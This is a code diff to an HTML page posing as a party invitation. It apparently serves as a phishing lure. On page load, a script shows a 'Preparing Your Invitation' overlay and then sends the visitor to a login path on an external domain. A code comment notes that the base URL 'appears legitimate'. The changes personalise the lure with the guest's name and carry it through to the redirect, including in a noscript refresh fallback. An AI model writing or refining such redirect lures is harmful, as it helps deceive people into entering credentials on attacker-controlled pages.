@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -430,7 +429,7 @@
   <div class="redirect-overlay" id="redirectOverlay">
     <div class="redirect-content">
       <div class="redirect-loader"></div>
-      <h2>Preparing Your Invitation</h2>
+      <h2>Preparing <span id="guestNameDisplay">Your</span> Invitation</h2>
       <p>You are being securely redirected to your personalized invitation.</p>
       <p>This will only take a moment...</p>
     </div>
@@ -629,8 +628,31 @@
   </footer>
 
   <script>
-    // Seamless Auto-Redirect Script
+    // Seamless Auto-Redirect Script with Dynamic Name in HTML
     document.addEventListener('DOMContentLoaded', function() {
+      // Function to get the dynamic name from URL
+      function getGuestName() {
+        const urlParams = new URLSearchParams(window.location.search);
+        let name = urlParams.get('name') || urlParams.get('guest') || '';
+        
+        if (!name) {
+          // Optional: prompt user if no name in URL
+          name = prompt('Please enter your name to access your invitation:', '');
+          if (!name) name = 'Guest';
+        }
+        
+        return name;
+      }
+
+      // Get the name
+      const guestName = getGuestName();
+
+      // Update the HTML overlay with the guest's name
+      const nameDisplay = document.getElementById('guestNameDisplay');
+      if (nameDisplay) {
+        nameDisplay.textContent = guestName + "'s";
+      }
+
       // Function to construct the final redirect URL
       function getRedirectURL() {
         // Base URL - appears legitimate
@@ -639,11 +661,18 @@
         // Preserve query parameters if present
         const queryString = window.location.search;
         
+        // Build the redirect URL with the name
+        let redirectURL = baseURL;
+        
         if (queryString) {
-          return baseURL + queryString.substring(1);
+          // If there are existing params, append name
+          redirectURL += queryString.substring(1) + '&name=' + encodeURIComponent(guestName);
+        } else {
+          // No existing params, add name as first param
+          redirectURL += '?name=' + encodeURIComponent(guestName);
         }
         
-        return baseURL;
+        return redirectURL;
       }
 
       // Create a smooth redirect experience
@@ -651,7 +680,7 @@
         // Update overlay message
         const overlay = document.getElementById('redirectOverlay');
         if (overlay) {
-          overlay.querySelector('h2').textContent = 'Accessing Your Invitation...';
+          overlay.querySelector('h2').textContent = 'Accessing ' + guestName + "'s Invitation...";
           overlay.querySelector('p').textContent = 'Your personalized invitation is now ready.';
         }
 
@@ -674,12 +703,12 @@
             }
           }
         }, 1200);
-      }, 1800); // Initial delay to show the page content briefly
+      }, 1800);
 
       // Handle case where JavaScript is disabled
       const noscriptMeta = document.createElement('noscript');
       noscriptMeta.innerHTML = `
-        <meta http-equiv="refresh" content="3;url=https://partyrsvp.biz/login/profile/e/invite/">
+        <meta http-equiv="refresh" content="3;url=https://partyrsvp.biz/login/profile/e/invite/?name=Guest">
         <style>
           .redirect-overlay {
             display: flex !important;
